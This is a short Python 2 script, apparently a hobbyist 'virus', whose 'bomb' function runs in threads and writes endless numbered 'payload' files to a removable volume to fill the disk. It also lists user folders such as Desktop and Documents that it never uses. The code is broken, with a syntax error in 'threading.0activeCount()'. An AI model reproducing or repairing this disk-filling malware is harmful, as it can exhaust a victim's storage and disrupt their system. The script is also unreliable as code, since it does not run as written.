#Cory Sparks
import getpass, time
import threading, thread
from threading import *

usr = getpass.getuser()
paths = ['Desktop', 'Documents', 'Contacts', 'Downloads', 'Favorites', 'Links', '.idlerc', 'Music', 'Pictures', 'Videos', 'Saved Games', 'Searches']
def bomb(boom):
    global usr, paths
    number = 0
    while True:
        number += 1
        for path in paths:
            try:
                print ''
                createFile = open('/Volumes/NO NAME/virus/payload'+str(number)+'.c', 'w+')
                createFile.write("Have Fun")
                createFile.close()
            except:
                pass
while 1:
    loop = True
    while loop:
        if threading.activeCount() < 3:
            print threading.0activeCount()
            t = Thread(target = bomb, args = ("nn", ))
            t.daemon = True #Dangerous
            t.start()
            loop = False
            time.sleep(0.01)
daemon = True
